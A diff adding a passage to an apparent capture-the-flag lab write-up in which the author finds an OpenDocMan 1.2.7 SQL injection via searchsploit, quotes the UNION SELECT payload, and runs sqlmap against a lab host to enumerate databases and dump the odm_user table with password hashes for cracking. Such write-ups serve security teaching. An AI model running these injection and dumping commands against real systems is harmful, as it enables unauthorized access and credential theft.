@@ -122,12 +122,91 @@ so i checked `searchsploit` for any known exploit for `opendocman` :
 root@kali: searchsploit opendocman
 
 OpenDocMan 1.2.7 - Multiple Vulnerabilities  | php/webapps/32075.txt
+```
 
+reading through [this](https://www.exploit-db.com/exploits/32075) document, it says there is a SQLi here :
 
+```text
+The exploitation example below displays version of the MySQL server:
 
+http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,v
+ersion%28%29,3,4,5,6,7,8,9
+```
 
+all we need to do is to replace the values according to our target and use sqlmap to attack the database :
 
+```text
+root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 --dbs
 
+available databases [6]:
+[*] drupal7
+[*] information_schema
+[*] jabcd0cs
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+```
+
+we are interested in `jabcd0cs` database so let's see the tables :
+
+```text
+root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs --tables
+
+[15 tables]
++-------------------+
+| odm_access_log    |
+| odm_admin         |
+| odm_category      |
+| odm_data          |
+| odm_department    |
+| odm_dept_perms    |
+| odm_dept_reviewer |
+| odm_filetypes     |
+| odm_log           |
+| odm_odmsys        |
+| odm_rights        |
+| odm_settings      |
+| odm_udf           |
+| odm_user          |
+| odm_user_perms    |
++-------------------+
+```
+
+what is better than `odm_user` table ? let's see the columns :
+
+```text
+root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs -T odm_user --columns
+
+[9 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| department    | int(11) unsigned |
+| Email         | varchar(50)      |
+| first_name    | varchar(255)     |
+| id            | int(11) unsigned |
+| last_name     | varchar(255)     |
+| password      | varchar(50)      |
+| phone         | varchar(20)      |
+| pw_reset_code | char(32)         |
+| username      | varchar(25)      |
++---------------+------------------+
+```
+
+i need all of them, so let's dump all the info :
+
+```text
+root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs -T odm_user --dump
+
++----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
+| id | Email              | phone       | password                         | username | last_name | department | first_name | pw_reset_code |
++----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
+| 1  | webmin@example.com | 5555551212  | b78aae356709f8c31118ea613980954b | webmin   | min       | 2          | web        | <blank>       |
+| 2  | guest@example.com  | 555 5555555 | 084e0343a0486ff05530df6c705c8bb4 | guest    | guest     | 2          | guest      | NULL          |
++----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
+```
+
+perfect, we know have the hashes, i just go for `webmin` user to crack the hash
 
 
 
